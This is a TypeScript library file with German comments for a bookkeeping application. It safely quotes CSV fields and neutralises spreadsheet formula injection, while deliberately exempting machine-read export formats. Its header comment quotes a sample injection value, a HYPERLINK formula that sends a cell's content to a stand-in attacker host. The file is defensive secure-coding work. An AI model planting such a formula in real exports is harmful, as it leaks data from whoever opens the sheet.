// ============================================================================
// ARGONAUT OS · lib/csvSchreiben.ts — EINE Stelle, die CSV-Felder schreibt
//
// Anlass (Prüfbefund 15.09.2026, bestätigt am 16.09. über alle 815 Dateien):
// Achtzehn Stellen im Haus erzeugen CSV-Dateien. Keine einzige neutralisierte
// eine Formel. Sechs Seiten machten nur `String(x).replace(/;/g, ',')`, vier
// weitere hatten je eine eigene, fast wortgleiche Quoting-Funktion.
//
// WARUM DAS GEFÄHRLICH IST
// Excel, LibreOffice und Google Sheets werten eine Zelle, die mit = + - oder @
// beginnt, als FORMEL aus — auch beim Öffnen einer CSV. Ein Lieferantenname aus
// der Beleg-Erkennung wie
//     =HYPERLINK("http://boese.example/"&A1;"Rechnung öffnen")
// wird dann beim Steuerberater ausgeführt, nicht angezeigt. Der Text kommt bei
// ARGONAUT teils aus fremden Dateien (Import) und aus OCR (Beleg-Inbox), also
// von außen. Das ist als "CSV Injection" bekannt.
//
// WAS DIESE DATEI TUT
//   1. Quoten nach RFC 4180 (Anführungszeichen verdoppeln, Feld einpacken,
//      sobald Trennzeichen, Anführungszeichen oder Zeilenumbruch drin sind).
//   2. Einem verdächtigen Feld ein Apostroph voranstellen. Das Tabellen-
//      programm zeigt den Text dann unverändert an und rechnet nicht damit.
//
// WAS SIE BEWUSST NICHT TUT — WICHTIG
// Sie gehört NICHT in maschinelle Schnittstellen. Ein vorangestelltes Apostroph
// würde dort den Import brechen. Ausdrücklich ausgenommen bleiben deshalb:
//   · lib/datevExtf.ts        — DATEV-EXTF wird von DATEV eingelesen, nicht
//                               von einem Menschen in Excel geöffnet.
//   · app/api/kasse-dsfinvk   — DSFinV-K liest die Prüfsoftware der
//                               Finanzverwaltung.
//   · importParser.baueMustervorlage — die Vorlage soll wieder EINGELESEN
//                               werden; ein Apostroph landete sonst in den
//                               Stammdaten des Kunden.
// Diese drei behalten ihr eigenes Quoting. Wer hier etwas ändert: die Grenze
// verläuft zwischen "ein Mensch öffnet das in Excel" und "eine Software liest
// das ein".
//
// Rein und node-testbar. Keine Hooks, kein Netz, Client und Server.
// ============================================================================

/** Standard-Trennzeichen im Haus: Semikolon (deutsches Excel). */
export const TRENNER = ';';

/**
 * Sieht dieser Wert für ein Tabellenprogramm wie eine Formel aus?
 *
 * = @ Tabulator und Wagenrücklauf sind IMMER verdächtig.
 * + und − nur dann, wenn keine Zahl dahinter steht: "-1.234,50" muss eine Zahl
 * bleiben, sonst zerbricht jede Summenformel in der exportierten Tabelle.
 * "+49 170 1234567" ist dagegen keine Zahl und wird geschützt — Excel würde
 * daraus sonst einen Formelfehler machen.
 */
export function formelVerdacht(wert: unknown): boolean {
  const t = wert == null ? '' : String(wert);
  if (t === '') return false;
  if (/^[=@\t\r]/.test(t)) return true;
  if (/^[+\-]/.test(t)) return !istReineZahl(t);
  return false;
}

/** Deutsche oder englische Zahlschreibweise, mit oder ohne Vorzeichen. */
function istReineZahl(wert: string): boolean {
  const t = wert.trim();
  if (t === '') return false;
  // 1.234,50 · -1234,5 · +7 · 1234.50 · -0,01 — aber nicht "1.2.3" oder "5 Stk"
  return /^[+-]?\d{1,3}(?:\.\d{3})*(?:,\d+)?$/.test(t)
    || /^[+-]?\d+(?:[.,]\d+)?$/.test(t);
}

/**
 * Ein einzelnes CSV-Feld: erst gegen Formeln sichern, dann quoten.
 * null und undefined werden zu einem leeren Feld — nicht zu "null".
 */
export function csvFeld(wert: unknown, trenner: string = TRENNER): string {
  // Haerte gegen `werte.map(csvFeld)`: Array.map reicht den INDEX als zweites
  // Argument durch, der Trenner waere dann 0, 1, 2 … und ein Semikolon im Feld
  // wuerde nicht mehr gequotet. Alles, was keine nichtleere Zeichenkette ist,
  // faellt deshalb auf den Standard zurueck.
  const tr = typeof trenner === 'string' && trenner !== '' ? trenner : TRENNER;
  let t = wert == null ? '' : String(wert);
  if (formelVerdacht(t)) t = `'${t}`;
  if (t.includes(tr) || /["\n\r]/.test(t)) {
    return `"${t.replace(/"/g, '""')}"`;
  }
  return t;
}

/** Eine Zeile aus mehreren Feldern. */
export function csvZeile(werte: readonly unknown[], trenner: string = TRENNER): string {
  return werte.map((w) => csvFeld(w, trenner)).join(trenner);
}

export type CsvOptionen = {
  trenner?: string;
  /** UTF-8-Byte-Order-Mark voranstellen — ohne zeigt Excel Umlaute falsch. */
  bom?: boolean;
  /** CRLF ist das, was Excel unter Windows erwartet. */
  zeilenende?: string;
};

/**
 * Eine vollständige CSV-Datei aus Zeilen von Feldern.
 * Die erste Zeile ist üblicherweise die Kopfzeile — sie wird genauso behandelt.
 */
export function csvText(zeilen: readonly (readonly unknown[])[], opt: CsvOptionen = {}): string {
  const trenner = opt.trenner ?? TRENNER;
  const ende = opt.zeilenende ?? '\r\n';
  const bom = opt.bom === false ? '' : '﻿';
  return bom + zeilen.map((z) => csvZeile(z, trenner)).join(ende);
}
